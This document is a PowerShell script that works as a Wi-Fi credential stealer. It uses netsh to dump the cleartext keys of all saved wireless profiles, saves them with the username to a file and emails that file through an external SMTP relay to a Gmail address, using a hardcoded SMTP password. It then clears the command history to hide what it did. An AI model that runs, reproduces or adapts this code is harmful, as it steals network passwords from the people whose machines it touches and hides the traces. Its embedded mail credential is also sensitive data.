
# filename
$logPath = "$env:username"+"_"+"$(get-date -f yyyyMMdd_hhmmss).txt"

# SMTP settings
$From = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
$To = "it.c0nt1n3ntal@gmail.com"
$Attachment = $logPath
$Subject = "WLAN Info " + $(get-date -f yyyyMMdd_hhmmss) 
$Body = "<h2>WLAN Info!</h2><br><br>"
$Body += ""
$SMTPServer = "smtp.mailersend.net"
$SMTPPort = "587"
# Create the credentials object
$smtpUsername = $From
$smtpPassword = ConvertTo-SecureString -String "oFENPhUJMs7TOQAf" -AsPlainText -Force
$smtpCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $smtpUsername, $smtpPassword

# Initialize an array to store all Wi-Fi profiles and their passwords
$wifiData = @()

# Get all Wi-Fi profiles
$profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'

foreach ($profile in $profiles) {
    $wlan = $profile.Matches.Value.Trim()

    # Get the password for the current Wi-Fi profile
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $password = if ($passw) { $passw.Matches.Value.Trim() } else { "No Password Found" }

    # Create a custom object with the profile and password information
    $wifiData += [PSCustomObject]@{
        Username = $env:username
        Profile  = $wlan
        Password = $password
    }
}

# Convert the array of Wi-Fi data to JSON
$jsonBody = $wifiData | ConvertTo-Json -Depth 3

# Save the JSON data to a file on the USB drive
$jsonBody | Out-File -FilePath $logPath -Encoding UTF8

Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $smtpCredential -Attachments $Attachment

# Clear the PowerShell command history
Clear-History

exit